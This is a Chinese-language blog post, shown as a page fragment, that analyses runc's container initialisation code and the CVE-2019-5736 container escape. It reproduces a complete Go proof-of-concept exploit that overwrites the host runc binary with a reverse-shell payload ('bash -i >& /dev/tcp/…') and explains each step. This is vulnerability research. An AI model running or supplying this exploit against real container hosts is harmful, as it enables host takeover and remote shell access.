class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// StartInitialization loads a container by opening the pipe fd from the parent</span></span><br><span class="line"><span class="comment">// to read the configuration and state. This is a low level implementation</span></span><br><span class="line"><span class="comment">// detail of the reexec and should not be consumed externally.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartInitialization</span><span class="params">()</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// Get the INITPIPE.</span></span><br><span class="line">    envInitPipe := os.Getenv(<span class="string">&quot;_LIBCONTAINER_INITPIPE&quot;</span>)</span><br><span class="line">    pipefd, err := strconv.Atoi(envInitPipe)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        err = fmt.Errorf(<span class="string">&quot;unable to convert _LIBCONTAINER_INITPIPE: %w&quot;</span>, err)</span><br><span class="line">        logrus.Error(err)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    pipe := os.NewFile(<span class="type">uintptr</span>(pipefd), <span class="string">&quot;pipe&quot;</span>)</span><br><span class="line">    <span class="keyword">defer</span> pipe.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// We have an error during the initialization of the container&#x27;s init,</span></span><br><span class="line">        <span class="comment">// send it back to the parent process in the form of an initError.</span></span><br><span class="line">        <span class="keyword">if</span> werr := writeSync(pipe, procError); werr != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Fprintln(os.Stderr, err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> werr := utils.WriteJSON(pipe, &amp;initError&#123;Message: err.Error()&#125;); werr != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Fprintln(os.Stderr, err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only init processes have FIFOFD.</span></span><br><span class="line">    fifofd := <span class="number">-1</span></span><br><span class="line">    envInitType := os.Getenv(<span class="string">&quot;_LIBCONTAINER_INITTYPE&quot;</span>)</span><br><span class="line">    it := initType(envInitType)</span><br><span class="line">    <span class="keyword">if</span> it == initStandard &#123;</span><br><span class="line">        envFifoFd := os.Getenv(<span class="string">&quot;_LIBCONTAINER_FIFOFD&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> fifofd, err = strconv.Atoi(envFifoFd); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to convert _LIBCONTAINER_FIFOFD: %w&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> consoleSocket *os.File</span><br><span class="line">    <span class="keyword">if</span> envConsole := os.Getenv(<span class="string">&quot;_LIBCONTAINER_CONSOLE&quot;</span>); envConsole != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        console, err := strconv.Atoi(envConsole)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to convert _LIBCONTAINER_CONSOLE: %w&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        consoleSocket = os.NewFile(<span class="type">uintptr</span>(console), <span class="string">&quot;console-socket&quot;</span>)</span><br><span class="line">        <span class="keyword">defer</span> consoleSocket.Close()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logPipeFdStr := os.Getenv(<span class="string">&quot;_LIBCONTAINER_LOGPIPE&quot;</span>)</span><br><span class="line">    logPipeFd, err := strconv.Atoi(logPipeFdStr)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;unable to convert _LIBCONTAINER_LOGPIPE: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get mount files (O_PATH).</span></span><br><span class="line">    mountFds, err := parseMountFds()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clear the current process&#x27;s environment to clean any libcontainer</span></span><br><span class="line">    <span class="comment">// specific env vars.</span></span><br><span class="line">    os.Clearenv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> e := <span class="built_in">recover</span>(); e != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ee, ok := e.(<span class="type">error</span>); ok &#123;</span><br><span class="line">                err = fmt.Errorf(<span class="string">&quot;panic from initialization: %w, %s&quot;</span>, ee, debug.Stack())</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                err = fmt.Errorf(<span class="string">&quot;panic from initialization: %v, %s&quot;</span>, e, debug.Stack())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    i, err := newContainerInit(it, pipe, consoleSocket, fifofd, logPipeFd, mountFds)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If Init succeeds, syscall.Exec will not return, hence none of the defers will be called.</span></span><br><span class="line">    <span class="keyword">return</span> i.Init()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后通过newContainerInit创建LinuxStandard对象，并调用LinuxStandard.Init函数进行容器初始化。</p>
<h2 id="LinuxStandard-Init"><a href="#LinuxStandard-Init" class="headerlink" title="LinuxStandard.Init"></a>LinuxStandard.Init</h2><p><a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/standard_init_linux.go#L48">https://github.com/opencontainers/runc/blob/537645fd52e97e1e33f3b6b8d71397affada9779/libcontainer/standard_init_linux.go#L48</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">func (l *linuxStandardInit) Init() error &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//Set network</span></span><br><span class="line">    <span class="keyword">if</span> err := setupNetwork(l.config); err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Set route</span></span><br><span class="line">    <span class="keyword">if</span> err := setupRoute(l.config.Config); err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialises the labeling system</span></span><br><span class="line">    selinux.GetEnabled()</span><br><span class="line">    <span class="comment">//切换为容器内的文件系统</span></span><br><span class="line">    <span class="keyword">if</span> err := prepareRootfs(l.pipe, l.config); err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// Check for the arg before waiting to make sure it exists and it is</span></span><br><span class="line">        <span class="comment">// returned as a create time error.</span></span><br><span class="line">        name, err := exec.LookPath(l.config.Args[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//启动容器进程替换自身进程</span></span><br><span class="line">    <span class="keyword">if</span> err := system.Exec(name, l.config.Args[<span class="number">0</span>:], os.Environ()); err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;can&#x27;t exec user process: %w&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nil</span><br></pre></td></tr></table></figure>

<p><code>Init()</code>函数会完成容器的网络设置、切换文件系统等操作，最后调用<code>system.Exec()</code>替换自身。至此，容器启动流程执行完毕。</p>
<h1 id="Poc分析"><a href="#Poc分析" class="headerlink" title="Poc分析"></a>Poc分析</h1><p><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">Frichetten&#x2F;CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line">import (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line">var payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/攻击机的ip/监听端口 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">    fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">    err = fd.Close()</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">    <span class="comment">// This will be the process created by runc</span></span><br><span class="line">    var found <span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">        pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> _, f := range pids &#123;</span><br><span class="line">            fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">            fstring := <span class="built_in">string</span>(fbytes)</span><br><span class="line">            <span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">                found, err = strconv.Atoi(f.Name())</span><br><span class="line">                <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                    fmt.Println(err)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">    var handleFd = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">        <span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">        handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">    <span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">            writeHandle.Write([]byte(payload))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在执行功能类似于docker exec的命令（其他的如docker run等，不再讨论）时，底层实际上是容器运行时在操作。例如runc，相应地，runc exec命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如cgroups）的情况下，启动一个进程。除此以外，这个操作与宿主机上执行一个程序并无二致。</p>
<p>执行过程大体是这样的：runc启动，加入到容器的命名空间，接着以自身（&#x2F;proc&#x2F;self&#x2F;exe，后面会解释）为范本启动一个子进程，最后通过exec系统调用执行用户指定的二进制程序，也就是&#x2F;bin&#x2F;sh。</p>
<p>这个过程看起来似乎没有问题。现在，我们需要让另一个角色出场——proc伪文件系统，即&#x2F;proc。关于这个概念，Linux文档已经给出了详尽的说明，这里我们主要关注&#x2F;proc下的两类文件：</p>
<ol>
<li><p>&#x2F;proc&#x2F;[PID]&#x2F;exe：它是一种特殊的符号链接，又被称为magic links（为什么将这类符号链接叫做magic links呢？这一点对当前漏洞的形成至关重要），指向进程自身对应的本地程序文件（例如我们执行ls，&#x2F;proc&#x2F;[ls-PID]&#x2F;exe就指向&#x2F;bin&#x2F;ls）；</p>
</li>
<li><p>&#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;：这个目录下包含了进程打开的所有文件描述符。</p>
</li>
</ol>
<p>&#x2F;proc&#x2F;[PID]&#x2F;exe的特殊之处在于，如果你去打开这个文件，在权限检查通过的情况下，内核将直接返回给你一个指向该文件的描述符（file descriptor），而非按照传统的打开方式去做路径解析和文件查找。这样一来，它实际上绕过了mnt命名空间及chroot对一个进程能够访问到的文件路径的限制。</p>
<p>那么，设想这样一种情况：在runc exec加入到容器的命名空间之后，容器内进程已经能够通过内部&#x2F;proc观察到它，此时如果打开&#x2F;proc&#x2F;[runc-PID]&#x2F;exe并写入一些内容，就能够实现将宿主机上的runc二进制程序覆盖掉！这样一来，下一次用户调用runc去执行命令时，实际执行的将是攻击者放置的指令。</p>
<p>在未升级的容器环境上，上述思路是可行的，但是攻击者想要在容器内实现宿主机上的代码执行（逃逸），还需要面对两个限制：</p>
<ol>
<li><p>需要具有容器内部root权限；</p>
</li>
<li><p>Linux不允许修改正在运行进程对应的本地二进制文件。</p>
</li>
</ol>
<p>事实上，限制1经常不存在，很多容器服务开放给用户的仍然是root权限；而限制2是可以克服的。</p>
<hr>
<p>要在容器中运行这一段poc代码。</p>
<p>poc首先定义了payload，这是一个反弹shell命令。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">err = fd.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码首先打开&#x2F;bin&#x2F;sh文件，得到其文件描述符，将它替换为&#x2F;proc&#x2F;self&#x2F;exe，即当前进程的可执行文件，即在容器中运行&#x2F;bin&#x2F;sh时，就会替换为当前进程的可执行文件。也就是说如果不替换的话，执行的时&#x2F;bin&#x2F;sh，&#x2F;proc中的进程就没有名为runc的进程，如果替换成&#x2F;proc&#x2F;self&#x2F;exe的话，当再次启动docker exec时，启动runc进程进入容器时，启动的进程就不是&#x2F;bin&#x2F;sh，运行的进程就是&#x2F;proc&#x2F;self&#x2F;exe的可执行文件，进程名就是runc。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line"><span class="comment">// This will be the process created by runc</span></span><br><span class="line"><span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">    pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">        fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">        fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">        <span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">            found, err = strconv.Atoi(f.Name())</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc的代码中循环查找&#x2F;proc中的进程，如果有runc进程，获取它的进程号。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line"><span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">    <span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">    handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">        handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在这段代码中，以只读方式打开&#x2F;proc&#x2F;runc-pid&#x2F;exe文件，得到其文件描述符。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line"><span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">        writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>持续尝试以写方式打开上面代码中获得的只读fd（&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[fd]），一开始总是返回失败，直到runc结束占用后写方式打开成功，立即通过该fd向宿主机上&#x2F;usr&#x2F;bin&#x2F;runc（名字也可能是&#x2F;usr&#x2F;bin&#x2F;docker-runc）写入攻击载荷；也就是payload反弹shell命令。</p>
<p>首先启动容器，在容器上运行poc，将&#x2F;bin&#x2F;sh替换为&#x2F;proc&#x2F;self&#x2F;exe,然后进入到循环查找runc进程的代码中，这个时候还找不到runc进程，然后再次运行docker exec，这个时候runc进程进入容器，但是执行的不是&#x2F;bin&#x2F;sh，而是&#x2F;proc&#x2F;self&#x2F;exe，所以在容器中我们就可以找到runc进程了，然后打开&#x2F;proc&#x2F;self&#x2F;exe，将其写为反弹shell命令，这样runc在容器中运行的就是反弹shell命令，这样就完成了攻击。</p>
<h1 id="内核流程分析"><a href="#内核流程分析" class="headerlink" title="内核流程分析"></a>内核流程分析</h1><p>有一类特殊的类似符号链接的对象称为“magic links”，可以在某些伪文件系统中找到它，例如 &#x2F;proc中的一些（示例包括 &#x2F;proc&#x2F;pid&#x2F;exe 和 &#x2F;proc&#x2F;pid&#x2F;fd &#x2F;*)。与普通的符号链接不同，magic links不是通过路径名扩展来解析的，而是充当对内核自己的文件句柄表示的直接引用。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://e3g4xrthd5.feishu.cn/docx/B2Ukdk2ouoDoSPxobuwcrpHtn3T">https://e3g4xrthd5.feishu.cn/docx/B2Ukdk2ouoDoSPxobuwcrpHtn3T</a></p>
<p><a target="_blank" rel="noopener" href="https://e3g4xrthd5.feishu.cn/docx/MtDAdNAHYo5xC8xGgaVcDXNlnac">Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/symlink.7.html">symlink(7) - Linux manual page — 符号链接(7) - Linux 手册页 (man7.org)</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
              <a href="/tags/docker/" rel="tag"><i class="fa fa-tag"></i> docker</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/12/15/%E5%AD%A6%E4%B9%A0-Linux-proc-pid-%E4%B8%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%88%86%E6%9E%90/" rel="prev" title="学习 Linux /proc/[pid]下文件访问权限分析">
      <i class="fa fa-chevron-left"></i> 学习 Linux /proc/[pid]下文件访问权限分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/12/21/%E5%AD%A6%E4%B9%A0-Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-prctl%E8%AF%A6%E8%A7%A3/" rel="next" title="学习 Linux 系统调用 prctl详解">
      学习 Linux 系统调用 prctl详解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
